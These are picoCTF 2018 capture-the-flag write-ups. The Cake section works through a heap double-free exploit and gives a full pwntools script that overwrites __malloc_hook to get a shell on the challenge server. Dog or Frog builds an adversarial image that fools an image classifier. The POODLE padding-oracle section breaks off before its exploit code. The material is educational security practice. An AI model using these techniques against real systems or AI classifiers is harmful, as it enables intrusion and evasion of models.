# picoCTF 2018 Writeups
## Table of Contents
### General Problems
* [Dog or Frog](#dog-or-frog)
### Cryptography
* [James Brahm Returns](#james-brahm-returns)
### Binary Exploitation
* [Cake](#cake)

## Problems
### Cake
##### Understanding the problem
For this problem we are given a binary file and a libc file. The first step to solving this problem is to reverse the binary file and try to get an understanding of what is going on. Upon doing this, we get the following C pseudocode of what's going on:

<details><summary>Cake Source Pseudocode</summary>

```C
struct shop {
    size_t money; // offset 0
    size_t customers; // offset 8
    struct cake* cakes[16]; // offset 16
};

struct cake {
    size_t price; // offset 0
    char name[8]; // offset 8
};

void make(struct shop* shop) {
    int i = index of first empty slot in shop->cakes;
    
    printf("Making the cake");

    shop->cakes[i] = malloc(16);
    if (shop->cakes[i] == NULL) {
        puts("malloc() return null");
        exit(1);
    }

    printf("Made cake %d\nName> ", i);
    fgets_eat(shop->cakes[i]->name, 8, stdin);

    printf("Price> ");
    shop->cakes[i]->price = get();
}

void inspect(struct shop* shop) {
    printf("Which one?\n> ");
    size_t i = get();
    if (i <= 15 && shop->cakes[i] != NULL) {
        printf("%s is being sold for $%lu\n",
                shop->cakes[i]->name,
                shop->cakes[i]->price);
    } else {
        printf("You didn' make cake %lu yet.\n", i);
    }
}

void serve(struct shop* shop) {
    printf("This customer looks...\n");
    size_t i = get();
    if (i <= 15 && shop->cakes[i] != NULL) {
        printf("The customer looks really happy with %s",
                shop->cakes[i]->name);
        shop->money += shop->cakes[i]->price;
        free(shop->cakes[i]);
        shop->customers--;
    } else {
        printf("Opps!\n");
    }
}

void wait() {
    printf("Twiddling thumbs");
    spin();
    putchar('\n');
}

size_t get() { // stack protection enabled
    size_t a = 0;
    scanf("%ul", &a);
    eat_line();
    return a;
}

void main() {
    srand(0x2df);
    while (true) {
        randomly choose whether to increment shop->customers;
        process_commad();
    }
}
```

</details>

The first thing we notice is a use-after-free. In the `serve` method

```C
void serve(struct shop* shop) {
    printf("This customer looks...\n");
    size_t i = get();
    if (i <= 15 && shop->cakes[i] != NULL) {
        printf("The customer looks really happy with %s",
                shop->cakes[i]->name);
        shop->money += shop->cakes[i]->price;
        free(shop->cakes[i]);
        shop->customers--;
    } else {
        printf("Opps!\n");
    }
}
```

we see that the cake we serve is freed but we still have access to it in the cakes array stored in our shop struct. How can we exploit this? Well, having just come out of doing contacts, it makes sense to try and utilize a double free in some sort of manner. Let's see what we have to work with.

##### Leaking libc
Thankfully the problem gives us an inspect cake functionality, and this clearly motivates us to leak something: namely libc so that we can defeat ASLR. Trying what we did in `contacts` doesn't work: If we create two cakes, free the first, then inspect the first, we don't get anything interesting. This is because the cakes are being allocated fastbin chunks, so simply inspecting the freed fastbin chunk won't help us leak anything (in `contacts` we had the ability to inspect a freed smallbin). In fact, looking at the `make` method, cakes only malloc 16 bytes of data which restricts a lot of what we were able to do in `contacts`.

This is where we get creative. Notice that each action we take has a chance of incrementing the number of customers we have. Moreover, looking at the store pointer (which has constant location in memory) we see that the structure is such that the total money made is stored in the first qword and the total customers waiting is stored in the second qword, and that the following memory stores all our cake pointers.
```
0x6030e0 <shop>:	0x0000000000000001	0x0000000000000002
0x6030f0 <shop+16>:	0x0000000000604420	0x0000000000604440
0x603100 <shop+32>:	0x0000000000000000	0x0000000000000000
0x603110 <shop+48>:	0x0000000000000000	0x0000000000000000
0x603120 <shop+64>:	0x0000000000000000	0x0000000000000000
0x603130 <shop+80>:	0x0000000000000000	0x0000000000000000
0x603140 <shop+96>:	0x0000000000000000	0x0000000000000000
0x603150 <shop+112>:	0x0000000000000000	0x0000000000000000
0x603160 <shop+128>:	0x0000000000000000	0x0000000000000000
```
(In the above memory, we see the shop data starts at `0x6030e0`, and that in this particular example we have sold $1 in total, we have two customers, and we have created 2 cakes). Notice that at the shop pointer, we can construct a fake fastbin chunk header provided we wait for the appropriate amount of customers. Since cakes malloc 16 bytes of data, it will be looking for a size of `0x20` in the header, meaning we must wait for 32 customers. What's any good about getting malloc to return shop's pointer? Well, we can overwrite, for example, the first cake's pointer to some GOT entry and then inspect said cake to leak libc. Here's what this sequence of events looks like:
```
create cake 0 -> create cake 1 -> serve cake 0 -> serve cake 1 -> serve cake 0
```
This is our double free, and it makes the fastbin list look like `address(cake 0) -> address(cake 1) -> address(cake 0)`. When we make a new cake, it will first get the address of cake 0 returned by malloc. Since price is the first thing written in the cake struct, we will use price to write a custom FD pointer for when malloc later returns this location in memory again. This looks like `make cake (price = 0x6030e0)` which makes the fastbin list look like `address(cake 1) -> address(cake 0) -> 0x6030e0`. Boom, now we just create two more cakes and the next cake we create will begin writing it's data at `0x6030e0 + 0x10`. We choose to leak the GOT entry for stdout, which happens to be at `0x6030c0`. We also choose to use the name field to overwrite cake 1's pointer with the GOT entry, and use the price field to overwrite cake 0's pointer to `0x6030e0` for reasons that will be explored later. The sequence of actions discussed in the paragraph are thus
```
make cake (price = 0x6030e0) -> make cake -> make cake -> make cake (price = 0x6030e0, name = p64(0x6030c0))
```
(here `p64` is a function that packs the address into a string). Finally calling inspect on cake 1 outputs stdout's GOT entry as the price.

##### Overwriting \_\_malloc\_hook
Perfect! We've leaked libc! Now it's time to use this to overwrite something important, for which we choose to overwrite \_\_malloc\_hook just like in contacts. How can we do this? Well, we can't do it like we did in contacts. In contacts, we used the fact that there is a `0x7f` byte that we can isolate as a fake chunk header very close to \_\_malloc\_hook. However, there is two problems with that here. Firstly, creating a cake requests only 16 bytes to which `0x7f` is too large of a size specifier. Secondly, creating a cake only let's us write 16 bytes, and using this `0x7f` as our fake header is too far away from \_\_malloc\_hook to let us overwrite it. How do we get around this? Well the trick is to notice that when creating a cake, the name attribute is stored at offset `+0x8` from the start of the cake, but it is written first (followed by writing price). Thus imagine we trick malloc to return the shop address while writing data for cake 1. Writing the name for cake 1 would overwrite cake 1's own pointer, to which we could replace with an abritrary address, and then when we input our price for cake 1 it will be written at the victim address we overwrote cake 1's pointer to. The goal is now reduced to setting up the scenario in which we are writing data for cake 1 at the location of shop.

The first problem we have to solve is the fact that we already allocated cake 1 in order to leak libc, so without some extra work, creating new cakes will never try to create cake 1 again. To solve this we can do another double free to trick malloc into returning the shop address, and then overwrite cake 1's pointer will null so that we can create it again. This looks like the following sequence of actions
```
serve cake 4 -> serve cake 3 -> serve cake 4 -> create cake (price = 0x6030e0) -> create cake -> create cake
```
At this pointer we know that, by having performed this double free, the top of the fastbin list has the address `0x6030e0`. However, we've done even better. Remember how when leaking libc we decided to overwrite cake 0's pointer with `0x6030e0`? Well when we malloc another cake and it returns `0x6030e0` as our address, it will read cake 0's pointer as the FD pointer and place `0x6030e0` on the fastbin list again. So really, after this double free our fastbin list looks like `0x6030e0 -> 0x6030e0`. Perfect! The first thing we do is create a new cake and use the name field to set cake 1's pointer to null.
```
create cake (name = p64(0))
```
Now when we create another cake, we will be writting the data for cake 1, and we will be writing it at a fake chunk located at the shop pointer. Since name gets written first we can overwrite cake 1's pointer with the address of \_\_malloc\_hook, and then by setting the price of cake 1 we can overwrite \_\_malloc\_hook with a one gadget.
```
create cake (name = p64(__malloc_hook), price = one_gadget)
```
Then the next time we malloc something, the \_\_malloc\_hook function will be called and we win. First we serve a cake to fix the fastbin list, then create a new cake and we're in!

###### Full Exploit
The full exploit is below.
```python
from pwn import *

def reset():
	r.recvuntil("> ", timeout=2)
	r.recvuntil("> ", timeout=2)

def free(idx):
	reset()
	r.sendline("S")
	r.recvuntil("> ")
	r.sendline(str(idx))

def allocate(name="", price="0"):
	reset()
	r.sendline("M")
	r.recvuntil("Name> ")
	r.sendline(name)
	r.recvuntil("Price> ")
	r.sendline(price)

def read(idx):
	reset()
	r.sendline("I")
	r.recvuntil("> ")
	r.sendline(str(idx))
	feedback = r.recvuntil("> ")
	return feedback.split("\n")[0].split("$")[-1]


def exploit():
	libc = ELF("./libc.so.6")
	
	#################### leak libc base #######################
	allocate()
	log.info("Applying fastbin attack...")
	allocate()
	allocate()

	free(1)
	free(2)
	free(1)
	log.success("Double free performed.")
	
	log.info("Overwriting FD pointer...")
	# Set FD pointer to customers location
	allocate(price=str(0x6030e0))	
	allocate()
	allocate()
	
	binsize = 0x20
	log.info("Waiting for " + str(binsize) + " customers...")
	r.recvuntil("> ")
	while True:
		r.sendline("I")
		r.recvuntil("> ")
		r.sendline("0")
		feedback = r.recvuntil("> ")
		if "have " + str(binsize) + " customers" in feedback:
			break
	
	log.info("Overwriting first cake's address...")
	# Set to address of GOT entry
	allocate(name=p64(0x6030c0), price=str(0x6030e0))
	address = int(read(1))
	libc_base = address - 0x3a5d70
	log.success("libc base found at: " + hex(libc_base))
	
	######################### Exploit #########################
	
	log.info("Performing fastbin attack...")
	free(4)
	free(3)
	free(4)
	
	log.success("Double free performed.")
	allocate(price=str(0x6030e0))
	allocate()
	allocate()
	
	log.info("Waiting for " + str(binsize) + " customers...")
	r.recvuntil("> ")
	while True:
		r.sendline("I")
		r.recvuntil("> ")
		r.sendline("0")
		feedback = r.recvuntil("> ")
		if "have " + str(binsize) + " customers" in feedback:
			break
	log.info("Prepping attack...")
	allocate(name=p64(0), price=str(0x6030e0))
	
	log.info("Performing attack...")
	victim = libc_base + 0x3a5260 - 0x8
	one_shot = libc_base + 0xf1147 + (0x3a5260 - libc.symbols["__malloc_hook"])
	allocate(name=p64(victim), price=str(one_shot))

	free(5)
	allocate()

	r.interactive()


if __name__ == "__main__":
	r = remote("2018shell2.picoctf.com", 36275)
	exploit()
```
The one point of interest is that pwntools ELF class got the wrong offset for \_\_malloc\_hook, and the error term happened to also be the same as the error in offset for the one gadget's given by david942j's [one gadget tool](https://github.com/david942j/one_gadget), which explains adding the term `(0x3a5260 - libc.symbols["__malloc_hook"])` to the one gadget address.

### Dog or Frog
The goal of this problem is to transform the image of trixi the dog into one that still looks very similar to the original, but get's falsely identified by a treefrog using the model they provided. Like any other problem I don't know how to approach I am going to try to find a blog post and a pre-existing library. I ended up finding [this](http://everettsprojects.com/2018/01/30/mnist-adversarial-examples.html) blog post and the [cleverhans](https://github.com/tensorflow/cleverhans) library. Simply following the tutorial and the using the provided solution stub we create our own example as
```python
...
import numpy as np

from cleverhans.attacks import BasicIterativeMethod
from cleverhans.utils_keras import KerasModelWrapper

from keras import backend
...
def labels_to_output_layer(labels):
	layers = np.zeros((len(labels), 1000))
	layers[np.arange(len(labels)), labels] = 1
	return layers

def create_img(img_path, img_res_path, model_path, target_str, target_idx, des_conf=0.95):
	...
	
	# TODO: YOUR SOLUTION HERE
	backend.set_learning_phase(False)
	sess = backend.get_session()
	wrap = KerasModelWrapper(model)
	bim = BasicIterativeMethod(wrap, sess = sess)
	output_layer = labels_to_output_layer([TREE_FROG_IDX])
	bim_params = {'eps_iter': 0.01,
		'nb_iter': 100,
		'y_target': output_layer,
		'clip_min': 0.,
		'clip_max': 1.,
		'verbose': True}
	adv = bim.generate_np(test, **bim_params)
	adv_pred = np.argmax(model.predict(adv), axis = 1)
	
	test = adv
	
	...
```
Running this alone get's us very close to the solution. Uploading it to the problem site we find that it get's identified as a tree frog with 99% confidence, but that it has a phash hamming distance difference of 9. Well, one way to fix this could be to increase the number of iterations done by the attack, but this I quickly learned would take to long. Instead, I opened up GIMP and overlayed the original image at 50% opacity on top of the produced image. Bingo! It is now similar enough to the original image and indentified as a tree frog.

##### Full Exploit
The full code, including the provided solution stub, is below.
```python
from keras.applications.mobilenet import preprocess_input
from keras.models import load_model
from keras.preprocessing.image import img_to_array, array_to_img
from PIL import Image
from imagehash import phash

import numpy as np

from cleverhans.attacks import BasicIterativeMethod
from cleverhans.utils_keras import KerasModelWrapper

from keras import backend

IMAGE_DIMS = (224, 224)
TREE_FROG_IDX = 31
TREE_FROG_STR = "tree_frog"


# I'm pretty sure I borrowed this function from somewhere, but cannot remember
# the source to cite them properly.
def hash_hamming_distance(h1, h2):
	s1 = str(h1)
	s2 = str(h2)
	return sum(map(lambda x: 0 if x[0] == x[1] else 1, zip(s1, s2)))


def is_similar_img(path1, path2):
	image1 = Image.open(path1)
	image2 = Image.open(path2)

	dist = hash_hamming_distance(phash(image1), phash(image2))
	return dist <= 1


def prepare_image(image, target=IMAGE_DIMS):
	# if the image mode is not RGB, convert it
	if image.mode != "RGB":
		image = image.convert("RGB")

	# resize the input image and preprocess it
	image = image.resize(target)
	image = img_to_array(image)
	image = np.expand_dims(image, axis=0)
	image = preprocess_input(image)
	# return the processed image
	return image

def labels_to_output_layer(labels):
	layers = np.zeros((len(labels), 1000))
	layers[np.arange(len(labels)), labels] = 1
	return layers

def create_img(img_path, img_res_path, model_path, target_str, target_idx, des_conf=0.95):
	test = Image.open(img_path).resize(IMAGE_DIMS)
	test = prepare_image(test)
	model = load_model(model_path)

	# TODO: YOUR SOLUTION HERE
	backend.set_learning_phase(False)
	sess = backend.get_session()
	wrap = KerasModelWrapper(model)
	bim = BasicIterativeMethod(wrap, sess = sess)
	output_layer = labels_to_output_layer([TREE_FROG_IDX])
	bim_params = {'eps_iter': 0.01,
		'nb_iter': 100,
		'y_target': output_layer,
		'clip_min': 0.,
		'clip_max': 1.,
		'verbose': True}
	adv = bim.generate_np(test, **bim_params)
	adv_pred = np.argmax(model.predict(adv), axis = 1)
	
	test = adv

	test = test.reshape((224,224,3))
	img = array_to_img(test)
	img.save(img_res_path)


if __name__ == "__main__":
	create_img("./trixi.png", "./trixi_frog.png", "./model.h5", TREE_FROG_STR, TREE_FROG_IDX)
	assert is_similar_img("./trixi.png", "./trixi_frog.png")
```

### James Brahm Returns
For this problem we are given a server to nc into as well as the source code of what's going on behind the scenes.

<details><summary>Source Code</summary>

```python

#!/usr/bin/python2 -u
from Crypto.Cipher import AES
import reuse
import random
from string import digits
import hashlib

agent_code = """flag"""
key = """key"""


def pad(message):
    if len(message) % 16 == 0:
        message = message + chr(16)*16
    elif len(message) % 16 != 0:
        message = message + chr(16 - len(message)%16)*(16 - len(message)%16)
    return message

def encrypt(key, plain, IV):
    cipher = AES.new( key.decode('hex'), AES.MODE_CBC, IV.decode('hex') )
    return IV + cipher.encrypt(plain).encode('hex')

def decrypt(key, ciphertext, iv):
    cipher = AES.new(key.decode('hex'), AES.MODE_CBC, iv.decode('hex'))
    return cipher.decrypt(ciphertext.decode('hex')).encode('hex')

def verify_mac(message):
    h = hashlib.sha1()    
    mac = message[-40:].decode('hex')
    message = message[:-40].decode('hex')
    h.update(message)
    if h.digest() == mac:
        return True
    return False
    
def check_padding(message):
    check_char = ord(message[-2:].decode('hex'))
    if (check_char < 17) and (check_char > 0): #bud
        return message[:-check_char*2]
    else:
        return False

welcome = "Welcome, Agent 006!"
print welcome
options = """Select an option:
Encrypt message (E)
Send & verify (S)
"""
while True:
    encrypt_or_send = raw_input(options)
    if "e" in encrypt_or_send.lower():
        
        sitrep = raw_input("Please enter your situation report: ")
        message = """Agent,
Greetings. My situation report is as follows:
{0}
My agent identifying code is: {1}.
Down with the Soviets,
006
""".format( sitrep, agent_code )
        PS = raw_input("Anything else? ")
        h = hashlib.sha1()
        message = message+PS
        h.update(message)
        message = pad(message+ h.digest())

        IV = ''.join(random.choice(digits + 'abcdef') for _ in range(32))
        print "encrypted: {}".format(encrypt(key, message, IV ))
    elif "s" in encrypt_or_send.lower():
        sitrep = raw_input("Please input the encrypted message: ")
        iv = sitrep[:32]
        c = sitrep[32:]
        if reuse.check(iv):
            message = decrypt(key, c, iv)
            message = check_padding(message)
            if message:
                if verify_mac(message):
                    print("Successful decryption.")
                else:
                    print("Ooops! Did not decrypt successfully. Please send again.")
            else:
                print("Ooops! Did not decrypt successfully. Please send again.")
        else:
            print("Cannot reuse IVs!")
```

</details>
Googling revalent attacks we find that the POODLE attack is what we are looking for and we find
[this](https://www.voidsecurity.in/2014/12/the-padding-oracle-in-poodle.html) amazing blog post. Adapting the code to our specific scenario, we are able to perform the attacks. The only major difficulty came in adjusting offsets, since, unlike in the blog's scenario, we do not fully control the prefix and suffix of the message following the flag. The flag is also wrapped in static text that we do not control.

##### Full Exploit
Below is the full exploit from the [voidsecurity blog post](https://www.voidsecurity.in/2014/12/the-padding-oracle-in-poodle.html) adapted to our problem.
